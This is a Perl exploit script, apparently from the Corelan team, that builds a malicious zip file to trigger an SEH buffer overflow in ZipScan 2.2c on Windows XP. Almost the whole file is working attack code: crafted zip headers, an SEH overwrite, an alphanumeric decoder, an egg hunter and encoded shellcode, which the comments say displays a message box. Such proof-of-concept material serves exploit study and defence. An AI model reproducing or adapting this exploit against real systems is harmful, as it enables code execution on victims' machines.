#!/usr/bin/perl
# Software      : ZipScan 2.2c (.zip)
# Bug found by  : Lincoln
# Author        : Lincoln & corelanc0d3r
# OS            : Windows
# Tested on     : XP SP3 En (VirtualBox)
# Type of vuln  : SEH
# Greetz to     : Corelan Security Team
# http://www.corelan.be:8800/index.php/security/corelan-team-members/
#
# Script provided 'as is', without any warranty.
# Use for educational purposes only.
# Do not use this code to do anything illegal !
#
# Note : you are not allowed to edit/modify this code.
# If you do, Corelan cannot be held responsible for any damages this may cause.
#
#
# Code :
print "|------------------------------------------------------------------|\n";
print "|                         __               __                      |\n";
print "|   _________  ________  / /___ _____     / /____  ____ _____ ___  |\n";
print "|  / ___/ __ \\/ ___/ _ \\/ / __ `/ __ \\   / __/ _ \\/ __ `/ __ `__ \\ |\n";
print "| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |\n";
print "| \\___/\\____/_/   \\___/_/\\__,_/_/ /_/   \\__/\\___/\\__,_/_/ /_/ /_/  |\n";
print "|                                                                  |\n";
print "|                                       http://www.corelan.be:8800 |\n";
print "|                                                                  |\n";
print "|-------------------------------------------------[ EIP Hunters ]--|\n\n";
print "[+] Exploit for ZipScan 2.2c \n";
 
 
 
my $filename="zipscan.zip";
my $ldf_header = "\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" .
"\x00\x00\x00\x00\x00\x00\x00\x00" .
"\x88\x13" .# file size: 5k
"\x00\x00\x00";
 
my $cdf_header = "\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" .
"\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x88\x13". # file size: 5k
"\x00\x00\x00\x00\x00\x00\x01\x00".
"\x24\x00\x00\x00\x00\x00\x00\x00";
 
my $eofcdf_header = "\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00".
"\xb6\x13\x00\x00". # +46
"\xa6\x13\x00\x00". # +30
"\x00\x00";
 
my $decoder =
#pop edx pop esp
"\x5b\x5b\x5b\x5b\x5c".
 
#jmp ebp
"\x25\x4A\x4D\x4E\x55".
"\x25\x35\x32\x31\x2A".
"\x2d\x55\x55\x55\x64".
"\x2d\x55\x55\x55\x64".
"\x2d\x56\x55\x56\x51".
"\x50".
 
#add ebp, 526h
"\x25\x4A\x4D\x4E\x55".
"\x25\x35\x32\x31\x2A".
"\x2d\x35\x69\x48\x54".
"\x2d\x25\x69\x48\x54".
"\x2d\x25\x68\x48\x52".
"\x50".
 
#jmp back to decoded op code
"\x7a\xb5";
 
#basereg ebp, modified egg hunter mov edx,ebp
#points egg hunter to unmodified shellcode
my $egg =
"UYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0".
"BBABXP8ABuJIOyJB2bPRPjs2shZmfNwLWuSj44ho".
"nXRWdpVPqdNkXznOrUZJNO45jGKOxgA";
 
#msg box "Exploited by Corelan Security Team"
#encoded with Alpha2 base reg edi
my $shellcode =
"w00tw00t".
"WYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0B".
"BABXP8ABuJIoy8c9JkgXYt3jTsiQYg9syQYqYbiRiW".
"9g9QYBiCsrc0CqSssssvW3aqJqzQQV8BpVPqQ4p712".
"KQQsqv1drBabbP2QRcrTprbw2RaSrpXrpTx2a72RU0".
"JCyPJrYSzpKPMrkRk59V1qtSuptQZaD75QqRnP2Rnb".
"rBbQJQVPQ3yV9pBaTPN2Ksa3Q74bPBl0KQSw6BdPLP".
"NBK3rsfqW0lrlpKBqQFQTpHBlRkpQPnbeppBn2Ksua".
"vrpWHRpBoswQxPPPuPLTsBpRy1UPQPKQq0KropH51p".
"QRPPL2kPPPlQVrd0E44pL2kCaruqWpLBlpKpPcd0Cd".
"uPPRXPCFQpKaJ0LPK2b2JpGSXPNRKw3BJW7Rpsucar".
"jpKQX53QVf7bpw9BnbKW4PtBlRkw5pQQZ0NBd410I0".
"orpDqBkppbkPLBnblpOSDPKRPQSpDqV0jaZCQrjBOq".
"T0M3wqarkSGcxPi3zPQrkPOPIrOG9ROSurKpCrlqUS".
"D3aUhrqau1Yrn0NPkpB1jsu0tRerq0JpKssqF2nBK3".
"vPlSr2K2lpKssSZPEpLPC6QSzbkPNPkW5qDRnRKqW4".
"1RmwHRosISabtcv74rgbLG5fQBj2C0Og2QT1XbfBiW".
"8sdpOpy2kQEpMv9CyrrpPbHpLpN0PRnQTpN3xRLRp2".
"rpKrxpM2lpKBoqYpoPKPO2oQiv1seG6QtpMpkF1PnS".
"yQX0MtrpQrC2lpGsu0LPD54sag2pMtxPNBKw9ROBiR".
"OPK0OPLRiqRsUQWBXG32x1RPL2pPl0EPppKpOrqPxQ".
"Ww3Suu2sv2nreVT3u4xV1REPQqspEp50D6RRmChV1p".
"LaT2D2dczBlSyaXcVQSbFpKroSsqu3v3TblCy2k0rp".
"PpPpMbKPN78rlarv0pMpMplpNpgQWpl3w2t2fVRpKs".
"hpC2NpIPoPIpoRiPoCraXPQrTqURQpQpHpEPp73PXQ".
"T4pQS77aRRnw2G5CtPq0K0kPKGHqSplSuBTaVu6pK0".
"9QXRCpE6X2p51G2PMv0shG5Pprqt8QRsiqUbPRpSdp".
"QRUbqrXQTVU1S3rrpPiPQU4PCv8savPQS2Cg5Ue3sC".
"cV1t8qRW5PBPL0PsQRp0nrbcxpQDpSaPSRp2OPPRRQ".
"UUhpCpTv1dpbp2B73W9PQPx3rpOpCQIsr2tBppeF1b".
"XSrpepQu872pPV0BLW6saQXCyRnaxBpPLbf74PEPr0".
"MCi0IBQqTt1pJprqSrBCsSSRp0QQVp2pKRo1X0PRpt".
"qpOVPPF6PbkPObqPECtsxSuRzQQ1QA";
 
#Filler
my $mjunk = "A" x 30;
 
# --- payload --- 5k total
my $junk = "A" x 22 . $egg . "A" x 3427;
my $nseh="\x7a\x06\x41\x41";
my $seh="\x16\x09\x01\x10"; #universal
my $payload = $junk.$nseh.$seh.$decoder.$shellcode.$mjunk;
$payload = $payload . ".txt";
 
print "[+] Size : " . length($payload)."\n";
system("del $filename");
print "[+] Creating new vulnerable file: $filename\n\n";
open(FILE, ">$filename");
print FILE $ldf_header . $payload . $cdf_header . $payload . $eofcdf_header;
close(FILE);
